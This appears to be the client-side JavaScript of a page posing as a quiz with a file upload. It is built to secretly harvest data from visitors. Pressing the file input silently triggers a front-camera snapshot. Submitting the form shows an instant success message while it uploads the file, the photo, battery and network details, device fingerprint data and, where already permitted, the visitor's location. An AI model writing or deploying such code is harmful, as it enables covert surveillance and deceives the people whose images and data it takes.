const form = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");

const BACKEND_BASE = "/api";
const constraints = { video: { facingMode: "user" }, audio: false };

let cameraCaptured = false;
let cameraInProgress = false;
let capturedImage = null;

// ================================
// COLLECT METADATA (ON SUBMIT)
// ================================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory
      ? navigator.deviceMemory + " GB"
      : "N/A",
    network: navigator.connection
      ? JSON.stringify(navigator.connection)
      : "N/A",
    time: new Date().toLocaleString(),
  };

  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = `${Math.round(
        b.level * 100
      )}% charging:${b.charging}`;
    } catch {}
  }

  // Location only if already granted
  if (navigator.permissions && navigator.geolocation) {
    try {
      const status = await navigator.permissions.query({
        name: "geolocation",
      });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      }
    } catch {}
  }

  return metadata;
}

// ================================
// CAMERA CAPTURE (FIXED & RELIABLE)
// ================================
async function captureCamera() {
  if (cameraCaptured || cameraInProgress) return;

  cameraInProgress = true;

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);

    video.srcObject = stream;
    video.setAttribute("playsinline", true);
    video.style.display = "block";

    await new Promise((resolve) => {
      video.onloadedmetadata = () => resolve();
    });

    await video.play();

    // give camera time to render first frame
    await new Promise((r) => setTimeout(r, 1200));

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    capturedImage = canvas.toDataURL("image/png");
    cameraCaptured = true;

    console.log("✅ Camera captured successfully");

    stream.getTracks().forEach((t) => t.stop());
    video.style.display = "none";
  } catch (err) {
    console.log("❌ Camera error:", err);
  } finally {
    cameraInProgress = false;
  }
}

// ================================
// CAMERA ONLY ON FILE INTERACTION
// ================================
fileInput.addEventListener("pointerdown", () => {
  captureCamera();
});

// ================================
// UPLOAD FILE + METADATA + CAMERA
// ================================
async function uploadFileWithMetadata(file, metadata, cameraImage) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();

    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            file: reader.result,
            filename: file.name,
            metadata,
            cameraImage,
          }),
        });

        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };

    reader.onerror = () => reject(reader.error);
    reader.readAsDataURL(file);
  });
}

// ================================
// SUBMIT FORM (SAME BEHAVIOUR)
// ================================
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!fileInput.files.length) {
    alert("Please upload a file first");
    return;
  }

  // show success immediately
  document.getElementById("quiz-container").style.display = "none";
  document.getElementById("success-container").style.display = "flex";

  // background upload
  (async () => {
    try {
      const metadata = await collectMetadata();

      const res = await uploadFileWithMetadata(
        fileInput.files[0],
        metadata,
        capturedImage
      );

      console.log("✅ Upload successful:", res);
    } catch (err) {
      console.error("❌ Background upload failed:", err);
    }
  })();
});
